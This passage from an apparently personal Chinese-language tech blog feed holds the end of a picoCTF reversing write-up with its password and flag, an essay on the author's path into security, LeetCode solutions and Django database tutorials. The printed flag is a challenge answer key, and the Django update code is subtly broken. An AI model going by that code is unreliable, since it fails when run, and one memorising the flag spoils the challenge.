punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> password<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"w4rm1ng_Up_w1tH_jAv4_be8d9806f18"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>picoCTF{w4rm1ng_Up_w1tH_jAv4_be8d9806f18}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>學習資訊安全動機與歷程</title>
      <link href="/%E7%8D%8E%E5%AD%B8%E9%87%91/%E6%88%B4%E5%A4%AB%E5%AF%87%E7%88%BE%E7%8D%8E%E5%AD%B8%E9%87%91%E5%BF%83%E5%BE%97/2023-04-21-Learning-CyberSecurity/"/>
      <url>/%E7%8D%8E%E5%AD%B8%E9%87%91/%E6%88%B4%E5%A4%AB%E5%AF%87%E7%88%BE%E7%8D%8E%E5%AD%B8%E9%87%91%E5%BF%83%E5%BE%97/2023-04-21-Learning-CyberSecurity/</url>
      
        <content type="html"><![CDATA[<h2 id="家庭背景的不同"><a href="#家庭背景的不同" class="headerlink" title="家庭背景的不同"></a>家庭背景的不同</h2><p>在我幼稚園小班的時候我爸就買了一台專屬於我的電腦，並完全不限制我使用的時間，我爸這麼做的目的竟是為了讓我不沉迷於電玩，他認為只要夠早接觸到電玩遲早會玩膩，這樣子以後就不會沉迷電玩，而果真在我一開始拿到電腦的我就像來到天堂似的每天拼命的玩，但到了國小我發現比起玩遊戲，我更喜歡的是研究遊戲是怎麼運作起來的，更想知道原理，所以便打開了我的資安歷程。</p><h2 id="資安動機的萌芽"><a href="#資安動機的萌芽" class="headerlink" title="資安動機的萌芽"></a>資安動機的萌芽</h2><p>在我幼稚園還沉溺於楓之谷這款遊戲的期間發生了我人生的一項轉淚點，我清楚地記得在我幼稚園中班放學後，我滿心期待的v75版海盜新職業更新的那一晚，我正創好剛出的新職業，我的帳號突然被登出，而在我重登進遊戲後我發現，我本尊的點裝與裝備全沒了，當時雖然我還小，但那個創傷我到現在還清楚地記得，從那時候我開始用我老爸的PTT到處發文(對我那時候就會用PTT)，看完鄉民的留言我才知道原來我被駭客給盜了，從那時候我開始有了資安的意識，並希望自己有一天可以防止這種情形再次發生。</p><h2 id="資安技術的歷程"><a href="#資安技術的歷程" class="headerlink" title="資安技術的歷程"></a>資安技術的歷程</h2><h3 id="小學階段"><a href="#小學階段" class="headerlink" title="小學階段"></a>小學階段</h3><p>到了小學三四年級我開始接觸到了Minecraft，在那時我對Minecraft這款能夠自己加入模組的客製化遊戲非常著迷，於是當時我決定架設一個含模組的私人伺服器，在當時的私人伺服器不像現在一樣成熟，更何況是包含第三方模組的伺服器可能需要非常理解程式與網路的運作觀念，但那時我的想法是:竟然我比其他人都早接觸電腦那我架設成功的機率應該更高一些，就憑這股動力於是我開始自學一些網路知識，包括NAT ，port forwarding， DMZ等網路技術與java程式語言，研究如何將別人寫好的code與server 串接，最後竟然真的架成功了，這讓我理解許多網路觀念與程式設計的實作<br>在我小學五六年級時，手機遊戲開始盛行，那時候有許多大大小小的單機遊戲，例如:Temple Run ， Subway Surfers，又或是神魔之塔，我還記得那時是因為我神魔之塔的轉珠真的非常爛，常常花寶石復活還打不過封王，那時為了去使用自動轉珠軟體，需要將手機解所root的權限，進而接觸到了手機root，而root後開始玩一些需要大權限的軟體，例如燒餅修改器(類似Cheat Engine)在那時候有了逆向程式與記憶體的概念，而那時候因為太多同學常常找我幫忙改值而我又不喜歡花時間去用搜尋法慢慢找記憶體位置，所以有去研究寫組合語言腳本達成快速處理。</p><h3 id="國中階段"><a href="#國中階段" class="headerlink" title="國中階段"></a>國中階段</h3><p>國中是我最叛逆的時候，而在某一天我去書局看到了一本Kali Linux滲透測試工具，當時一翻開書就看到裡面介紹非常多滲透測試的工具讓我非常的興奮，馬上就想買回家裡研讀，還記得當時錢不夠還先跟朋友借了錢(因為那本要1000)，在研讀完這本書後，因為那時一直想要實際的演練，但不知道亂攻擊設備會有法律責任，所以在國中上電腦課時使用了live 版的kali linux裝在usb裡，乘開機時進bios切換系統，在上課的時候攻擊了學校的網站，當下學校的網路中心馬上就發現流量的異常於是我被當場抓包，記了兩支大過，老師甚至說要交給警方處理(最後私下處理)，從那之後我才知道學習紅隊演練原來是要防止攻擊，而不是去攻擊別人。</p><h3 id="高中階段"><a href="#高中階段" class="headerlink" title="高中階段"></a>高中階段</h3><p>高一時因為不想讀太遠的學校所以選擇就讀離家近的新北高工，也因為入學成績較高，所以被主任詢問要不要當技能競賽的選手，而我毅然決然地答應並選擇了資訊與網路技術的職類，在這個職類中需要根據題目的需求架設出相對應的服務，有些功能可能網路上找不到教學，必須靠自己的網路觀念去實作出來，例如:架設Apache Server 具有 Load Balancer功能可能比賽前沒有記住如何設定的話可以使用DNS cache的機制去做到，而我在這個職類中我學習到了更多伺服器的架設與Cisco網路的設定，還有靈活運用所學技能創造出更多的可能。<br>而在我高二的時候因為國際技能競賽加了新的職類「網路安全」，當時我有參加第一次的選拔，因為國際賽時程的關係，必須在比賽前選出國手，所以採學科決定國手選拔名單，而在我高二那年成功晉級到了國手選拔賽，但可惜最後的決賽沒有選上國手，不過這讓我有更想繼續比網路安全這項職類的渴望<br>而到了高三我決定再比一次「網路安全」，但我們主任很反對，他說我們學校資源只會分配在比較有成績的職類上例如: 「網頁設計」 「商務軟體設計」這兩項職類都有國手學長姊的幫助，所以當我要報名「網路安全」時是沒辦法申請經費的，而那時的我就決定自費參加，最後在我和我隊友的努力下成功獲得第51屆全國決賽的第一名，在這比賽中學習到了伺服器安全的強化，數位鑑識，IDS&#x2F;IPS系統的架設等還有許多CTF比賽中的技巧，使我獲益良多。</p><h3 id="大學階段"><a href="#大學階段" class="headerlink" title="大學階段"></a>大學階段</h3><p>在大學開學前我參加了我第一次的AIS3 2022(軟體安全組)，在裡面認識了許多志同道合的好朋友甚至是貴人，而最令我印象深刻的課是關鍵基礎設施有關烏克蘭電廠事件，聽完我才知道原來不是IT資安很重要OT也非常重要，所以在開學後我擔任了臺科大工業 4.0 中心工控紅藍隊演練研究助理，並持續精進邁向資安的道路。</p>]]></content>
      
      
      <categories>
          
          <category> 資安相關 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[107] Binary Tree Level Order Traversal II</title>
      <link href="/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-07-LeetCode-107/"/>
      <url>/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-07-LeetCode-107/</url>
      
        <content type="html"><![CDATA[<h2 id="107-Binary-Tree-Level-Order-Traversal-II"><a href="#107-Binary-Tree-Level-Order-Traversal-II" class="headerlink" title="107. Binary Tree Level Order Traversal II"></a>107. Binary Tree Level Order Traversal II</h2><p>難度:Medium</p><p>Python:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Definition for a binary tree node.</span><span class="token comment"># class TreeNode:</span><span class="token comment">#     def __init__(self, val=0, left=None, right=None):</span><span class="token comment">#         self.val = val</span><span class="token comment">#         self.left = left</span><span class="token comment">#         self.right = right</span><span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> depth<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> root <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">if</span> depth <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            result<span class="token punctuation">[</span>depth<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        dfs<span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">,</span> depth<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>    dfs<span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">,</span> depth<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">levelOrderBottom</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> root<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>TreeNode<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> List<span class="token punctuation">[</span>List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        dfs<span class="token punctuation">(</span>root<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>        result<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>C++:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">void dfs(TreeNode* root, int depth, vector&lt;vector&lt;int&gt;&gt;&amp; result) &#123;    if(root &#x3D;&#x3D; nullptr)&#123;        return;    &#125;    if(depth &#x3D;&#x3D; result.size()) &#123;        result.push_back(&#123;&#125;);    &#125;        result[depth].push_back(root-&gt;val);        dfs(root-&gt;left,depth+1,result);    dfs(root-&gt;right, depth+1,result);&#125;class Solution &#123;public:    vector&lt;vector&lt;int&gt;&gt; levelOrderBottom(TreeNode* root) &#123;        vector&lt;vector&lt;int&gt;&gt; result;        dfs(root, 0, result);        reverse(begin(result), end(result));        return result;    &#125;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[441] Arranging Coins</title>
      <link href="/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-04-LeetCode-441/"/>
      <url>/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-06-04-LeetCode-441/</url>
      
        <content type="html"><![CDATA[<h2 id="441-Arranging-Coins"><a href="#441-Arranging-Coins" class="headerlink" title="441. Arranging Coins"></a>441. Arranging Coins</h2><p>難度:Easy</p><p>Python:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">arrangeCoins</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># r: 把第 1 ~ k 層塞滿會用到多少硬幣</span>    r <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># k: 目前要塞的是第幾層</span>    k <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        r <span class="token operator">+=</span> k             <span class="token keyword">if</span> r <span class="token operator">></span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> k <span class="token operator">-</span> <span class="token number">1</span>        k <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">arrangeCoins</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> arrangeCoins<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python 公式解:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">arrangeCoins</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> n <span class="token operator">+</span> <span class="token number">0.25</span><span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">0.5</span> <span class="token operator">-</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 資料庫CRUD</title>
      <link href="/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-06-01-Django%20CRUD/"/>
      <url>/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-06-01-Django%20CRUD/</url>
      
        <content type="html"><![CDATA[<h2 id="新增資料-Create"><a href="#新增資料-Create" class="headerlink" title="新增資料(Create)"></a>新增資料(Create)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    Name <span class="token operator">=</span> <span class="token string">'Andy'</span>    Sex <span class="token operator">=</span>  <span class="token string">'M'</span>    Birthday <span class="token operator">=</span>  <span class="token string">'2022-02-02'</span>    Email <span class="token operator">=</span> <span class="token string">'Andy@gmail.com'</span>    Phone <span class="token operator">=</span>  <span class="token string">'0987654321'</span>    Addr <span class="token operator">=</span>  <span class="token string">'新北市三重區xx路xx號x樓'</span>    Class <span class="token operator">=</span> <span class="token string">'301'</span>    ClassOfficers <span class="token operator">=</span> <span class="token string">'班長'</span>    data <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>create<span class="token punctuation">(</span>Name<span class="token operator">=</span>Name<span class="token punctuation">,</span> Sex<span class="token operator">=</span>Sex<span class="token punctuation">,</span> Birthday<span class="token operator">=</span>Birthday<span class="token punctuation">,</span> Email<span class="token operator">=</span>Email<span class="token punctuation">,</span>Phone<span class="token operator">=</span>Phone<span class="token punctuation">,</span> Addr<span class="token operator">=</span>Addr<span class="token punctuation">,</span>Class<span class="token operator">=</span>Class<span class="token punctuation">,</span>    ClassOfficers<span class="token operator">=</span>ClassOfficers<span class="token punctuation">)</span>     data<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#寫入資料庫</span>    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">"home.html"</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="讀取資料-Read"><a href="#讀取資料-Read" class="headerlink" title="讀取資料(Read)"></a>讀取資料(Read)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 取得student所有資料</span>    student_all <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 取得名字為root的學生(Get用於單個)</span>    Name_root_Get <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>Name<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">)</span>    <span class="token comment"># 取得名字為Andy的學生(Filter用於多個)</span>    Name_Andy_Filter <span class="token operator">=</span>  student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>Name<span class="token operator">=</span><span class="token string">"Andy"</span><span class="token punctuation">)</span>    <span class="token comment"># 取得幹部為班長的學生</span>    ClassOfficers_Filter <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ClassOfficers<span class="token operator">=</span><span class="token string">"班長"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">"home.html"</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="修改資料-Update"><a href="#修改資料-Update" class="headerlink" title="修改資料(Update)"></a>修改資料(Update)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Update</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 需先取得資料 -> 修改 -> 存擋</span>    <span class="token comment"># 修改一筆</span>    Name_root_Get <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>Name<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">)</span>    Name_root_Get<span class="token punctuation">.</span>Birthday <span class="token operator">=</span> <span class="token string">"2022-06-25"</span>    Name_root_Get<span class="token punctuation">.</span>Addr <span class="token operator">=</span> <span class="token string">"台北市大安區基隆路xxx號"</span>    Name_root_Get<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#存檔</span>    <span class="token comment"># 修改多筆</span>    ClassOfficers＿Filter <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ClassOfficers<span class="token operator">=</span><span class="token string">"班長"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> ClassOfficers_Filter<span class="token punctuation">:</span>        x<span class="token punctuation">.</span>Commendation <span class="token operator">+=</span> <span class="token number">1</span> <span class="token comment"># 嘉獎+1</span>    ClassOfficers_Filter<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">"home.html"</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="刪除資料-Delete"><a href="#刪除資料-Delete" class="headerlink" title="刪除資料(Delete)"></a>刪除資料(Delete)</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 需先取得資料 -> 刪除</span>    <span class="token comment"># 刪除一筆</span>    Name_root_Get <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>Name<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">)</span>    Name_root_Get<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 刪除多筆</span>    Name_Andy_Filter <span class="token operator">=</span> student<span class="token punctuation">.</span>objects<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>Name<span class="token operator">=</span><span class="token string">"Andy"</span><span class="token punctuation">)</span>    Name_Andy_Filter<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">"home.html"</span><span class="token punctuation">,</span><span class="token builtin">locals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 後端開發 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 資料庫建立、註冊</title>
      <link href="/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-05-31-Django%20%E8%B3%87%E6%96%99%E5%BA%AB%E5%BB%BA%E7%AB%8B%E3%80%81%E8%A8%BB%E5%86%8A/"/>
      <url>/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-05-31-Django%20%E8%B3%87%E6%96%99%E5%BA%AB%E5%BB%BA%E7%AB%8B%E3%80%81%E8%A8%BB%E5%86%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="1-建立資料庫模型"><a href="#1-建立資料庫模型" class="headerlink" title="1. 建立資料庫模型"></a>1. 建立資料庫模型</h2><p>編輯models.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>db <span class="token keyword">import</span> models<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    Name <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">,</span> null<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    Sex <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'M'</span><span class="token punctuation">,</span> null<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    Birthday <span class="token operator">=</span> models<span class="token punctuation">.</span>DateField<span class="token punctuation">(</span>null<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    Email <span class="token operator">=</span> models<span class="token punctuation">.</span>EmailField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    Phone <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    Addr <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    Class <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    ClassOfficers <span class="token operator">=</span> models<span class="token punctuation">.</span>CharField<span class="token punctuation">(</span>max_length<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    Commendation <span class="token operator">=</span> models<span class="token punctuation">.</span>IntegerField<span class="token punctuation">(</span>null<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>blank<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>Name    <span class="token comment"># max_length代表最大長度20字元</span>    <span class="token comment"># default='M'代表預設值為M</span>    <span class="token comment"># null=False代表不可空白</span>    <span class="token comment"># blank=True代表預設空字串</span>    <span class="token comment"># editable代表是否可顯示，預設為True</span>    <span class="token comment"># unique代表是否為唯一值，預設為False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-建立migration資料檔"><a href="#2-建立migration資料檔" class="headerlink" title="2. 建立migration資料檔"></a>2. 建立migration資料檔</h2><pre class="line-numbers language-none"><code class="language-none">python manage.py makemigrations<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-模型與資料庫同步"><a href="#3-模型與資料庫同步" class="headerlink" title="3. 模型與資料庫同步"></a>3. 模型與資料庫同步</h2><pre class="line-numbers language-none"><code class="language-none">python manage.py migrate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-註冊於admin管理後台"><a href="#4-註冊於admin管理後台" class="headerlink" title="4. 註冊於admin管理後台"></a>4. 註冊於admin管理後台</h2><p>編輯admin.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin<span class="token keyword">from</span> studentsapp<span class="token punctuation">.</span>models <span class="token keyword">import</span> studentadmin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>register<span class="token punctuation">(</span>student<span class="token punctuation">,</span>studentAdmin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="5-建立後台管理使用者"><a href="#5-建立後台管理使用者" class="headerlink" title="5. 建立後台管理使用者"></a>5. 建立後台管理使用者</h2><pre class="line-numbers language-none"><code class="language-none">python manage.py createsuperuser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-啟動伺服器"><a href="#6-啟動伺服器" class="headerlink" title="6. 啟動伺服器"></a>6. 啟動伺服器</h2><pre class="line-numbers language-none"><code class="language-none">python manage.py runserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 後端開發 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[202] Happy Number</title>
      <link href="/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-03-22-LeetCode-Happy_Number/"/>
      <url>/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-03-22-LeetCode-Happy_Number/</url>
      
        <content type="html"><![CDATA[<h2 id="1-題目"><a href="#1-題目" class="headerlink" title="1. 題目"></a>1. 題目</h2><p>Write an algorithm to determine if a number is “happy”.</p><p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p><p>Example:</p><pre class="line-numbers language-none"><code class="language-none">Input: 19Output: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Explanation:</p><ul><li>1 * 1 + 9 * 9 &#x3D; 82</li><li>8 * 8 + 2 * 2 &#x3D; 68</li><li>6 * 6 + 8 * 8 &#x3D; 100</li><li>1 * 1 + 0 * 0 + 0 * 0 &#x3D; 1</li></ul><h2 id="2-思路"><a href="#2-思路" class="headerlink" title="2. 思路"></a>2. 思路</h2><p>因為不是Happy number的話會進入迴圈 (loops endlessly in a cycle) 所以可想到 <a href="https://en.wikipedia.org/wiki/Cycle_detection">floyd’s cycle detection</a></p><h2 id="3-解題"><a href="#3-解題" class="headerlink" title="3.解題"></a>3.解題</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">check_happy</span><span class="token punctuation">(</span><span class="token 